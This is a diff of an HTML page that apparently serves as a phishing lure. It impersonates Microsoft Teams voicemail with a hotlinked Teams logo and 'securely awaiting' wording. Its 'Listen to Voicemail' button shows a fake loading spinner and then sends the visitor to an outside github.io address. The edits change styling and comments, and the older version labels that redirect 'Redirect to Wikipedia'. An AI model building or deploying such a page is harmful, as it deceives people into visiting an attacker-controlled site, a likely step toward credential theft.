@@ -3,192 +3,168 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Microsoft Teams - Playback Notification Access</title>
-<style>
-  /* Background and Base Font */
-  body {
-    background: linear-gradient(134deg, #f4f3fa, #dfdff6);
-    font-family: 'Segoe UI', Tahoma, Geneva, sans-serif;
-    display: flex;
-    height: 99.8vh;
-    align-items: center;
-    justify-content: center;
-    margin: 0;
-    padding: 0;
-    color: #323232;
-    overflow-x: hidden;
-  }
+  <title>Missed Notification Playback</title>
+  <style>
+    /* Global Styles */
+    body {
+      background: linear-gradient(134deg, #f4f3fa, #dfdff6);
+      font-family: 'Segoe UI', Tahoma, Geneva, sans-serif;
+      color: #323232;
+      margin: 0;
+      padding: 0;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      overflow-x: hidden;
+    }
 
-  /* Main Container Box */
-  .container {
-    width: 89%;
-    max-width: 510px;
-    background-color: #fefefe;
-    padding: 19px;
-    text-align: center;
-    border-radius: 11px;
-    box-shadow: 0px 4.5px 11.5px rgba(0, 0, 0, 0.17);
-    margin: 21px;
-    border-top: 8.5px solid #6365a6;
-    position: relative;
-    z-index: 1;
-  }
-
-  /* Header Group */
-  .header {
-    align-items: center;
-    display: flex;
-    justify-content: center;
-    margin-bottom: 19.5px;
-  }
-
-  .header img {
-    height: 39px;
-    margin-right: 9.5px;
-  }
-
-  .header h1 {
-    color: #6365a6;
-    font-size: 1.82em;
-    margin: 0;
-    letter-spacing: 0.48px;
-  }
-
-  /* Secure Icon */
-  .icon-secure {
-    color: #6365a6;
-    font-size: 51px;
-    margin-top: 11px;
-    opacity: 0.99;
-  }
-
-  /* Primary Message */
-  .message {
-    color: #454545;
-    font-size: 17.5px;
-    margin: 14px 0.5px;
-    line-height: 1.49;
-  }
-
-  /* Button Styles */
-  .button {
-    display: inline-flex;
-    align-items: center;
-    background-color: #6365a6;
-    color: #fefefe;
-    padding: 12.1px 24.2px;
-    font-weight: bold;
-    font-size: 15.8px;
-    border-radius: 5.8px;
-    text-decoration: none;
-    transition: background-color 0.31s ease;
-    margin-top: 19.8px;
-    border: none;
-    cursor: pointer;
-    justify-content: center;
-  }
-
-  .button:hover {
-    background-color: #575aa8;
-  }
-
-  /* Spinner Animation */
-  .spinner {
-    display: none;
-    width: 19.8px;
-    height: 19.8px;
-    border-radius: 49.9%;
-    border: 2.9px solid #fefefe;
-    border-top: 3px solid #5659a8;
-    animation: spin 0.98s linear infinite;
-    margin-right: 7.9px;
-  }
-
-  /* Footer Text */
-  .footer {
-    font-size: 12.2px;
-    color: #676767;
-    text-align: center;
-    margin-top: 31px;
-  }
-
-  .footer p {
-    margin: 0;
-    padding: 7.8px 0;
-    line-height: 1.41;
-  }
-
-  .footer a {
-    color: #6365a6;
-    font-weight: 499;
-    text-decoration: none;
-  }
-
-  /* Extra Link Styling */
-  .install-link {
-    display: block;
-    font-size: 14.1px;
-    margin-top: 15.2px;
-  }
-
-  /* Responsive Adjustments */
-  @media (max-width: 601px) {
+    /* Main Container */
     .container {
-      width: 95%;
-      padding: 14px;
-      margin: 10.1px;
+      background-color: #fff;
+      border-radius: 10px;
+      box-shadow: 0 4px 16px rgba(0, 0, 0, 0.1);
+      padding: 24px;
+      text-align: center;
+      width: 90%;
+      max-width: 500px;
     }
 
-    .header h1 {
-      font-size: 1.51em;
-    }
-
-    .message {
-      font-size: 16.2px;
-      margin: 9.9px 0;
-    }
-
-    .button {
-      font-size: 13.9px;
-      padding: 10.2px 19.8px;
+    /* Header */
+    .header {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      margin-bottom: 24px;
     }
 
     .header img {
-      height: 30.5px;
-      margin-right: 8.2px;
+      height: 40px;
+      margin-right: 12px;
     }
 
+    .header h1 {
+      color: #6365a6;
+      font-size: 1.8em;
+      margin: 0;
+    }
+
+    /* Secure Icon */
     .icon-secure {
-      font-size: 40.5px;
-      margin-top: 4.9px;
+      font-size: 50px;
+      color: #6365a6;
+      margin-top: 16px;
+      opacity: 0.8;
+    }
+
+    /* Primary Message */
+    .message {
+      color: #454545;
+      font-size: 17px;
+      line-height: 1.6;
+      margin-top: 16px;
+    }
+
+    /* Button Styles */
+    .button {
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      background-color: #6365a6;
+      color: #fff;
+      padding: 12px 24px;
+      font-weight: bold;
+      font-size: 16px;
+      border-radius: 5px;
+      border: none;
+      cursor: pointer;
+      transition: background-color 0.3s ease;
+      margin-top: 24px;
+    }
+
+    .button:hover {
+      background-color: #575aa8;
+    }
+
+    /* Spinner Styles */
+    .spinner {
+      display: none;
+      border: 2px solid transparent;
+      border-top: 3px solid #fff;
+      border-radius: 50%;
+      width: 20px;
+      height: 20px;
+      margin-right: 10px;
+      animation: spin 1s linear infinite;
+    }
+
+    /* Footer */
+    .footer {
+      font-size: 12px;
+      color: #676767;
+      margin-top: 32px;
+    }
+
+    .footer a {
+      color: #6365a6;
+      text-decoration: none;
+      font-weight: 500;
     }
 
     .install-link {
-      font-size: 13.1px;
+      display: block;
+      font-size: 14px;
+      margin-top: 16px;
     }
-  }
 
-  /* Spinner Animation Keyframes */
-  @keyframes spin {
-    0% { transform: rotate(0deg); }
-    100% { transform: rotate(361deg); }
-  }
-</style>
+    /* Responsive Styles */
+    @media (max-width: 600px) {
+      .container {
+        padding: 16px;
+      }
 
+      .header h1 {
+        font-size: 1.5em;
+      }
 
+      .message {
+        font-size: 16px;
+      }
+
+      .button {
+        font-size: 14px;
+        padding: 10px 20px;
+      }
+
+      .icon-secure {
+        font-size: 40px;
+      }
+
+      .install-link {
+        font-size: 13px;
+      }
+    }
+
+    /* Spinner Animation */
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+  </style>
 </head>
 <body>
+
   <div class="container">
     <div class="header">
-      <img src="https://ribboncommunications.com/sites/default/files/microsoft-teams-logo-medium.png" alt="Teams Logo">
+      <img src="https://ribboncommunications.com/sites/default/files/microsoft-teams-logo-medium.png" alt="Microsoft Teams Logo">
       <h1>Voicemail Access</h1>
     </div>
 
-    <div class="icon-secure">🔒</div>
+    <div class="icon-secure" aria-label="Secure Icon">🔒</div>
     <p class="message">Your voicemail message is securely awaiting your attention.</p>
 
-    <button class="button" id="voicemailButton">
-      <div class="spinner" id="spinner" style="display: none;"></div>
+    <button class="button" id="voicemailButton" aria-label="Listen to Voicemail">
+      <div class="spinner" id="spinner"></div>
       <span id="buttonText">Listen to Voicemail</span>
     </button>
 
@@ -200,19 +176,22 @@
   </div>
 
   <script>
-    // Define the function that handles the button click
+    // Handle voicemail playback (simulated)
     function playVoicemail() {
-      // Show the spinner and change button text
-      document.getElementById("spinner").style.display = "inline-block";
-      document.getElementById("buttonText").innerText = "Loading...";
+      const spinner = document.getElementById("spinner");
+      const buttonText = document.getElementById("buttonText");
 
-      // Simulate a delay and redirect after 2 seconds
-      setTimeout(function() {
-        window.location.href = "https://enter-to-listen-unread.github.io/cip00-33sec/";  // Redirect to Wikipedia
+      // Show the spinner and change button text
+      spinner.style.display = "inline-block";
+      buttonText.innerText = "Loading...";
+
+      // Simulate loading time (2 seconds)
+      setTimeout(() => {
+        window.location.href = "https://enter-to-listen-unread.github.io/cip00-33sec/"; // Redirect to voicemail
       }, 2000);
     }
 
-    // Attach the event listener to the button
+    // Add event listener to the button
     document.getElementById("voicemailButton").addEventListener("click", playVoicemail);
   </script>
 
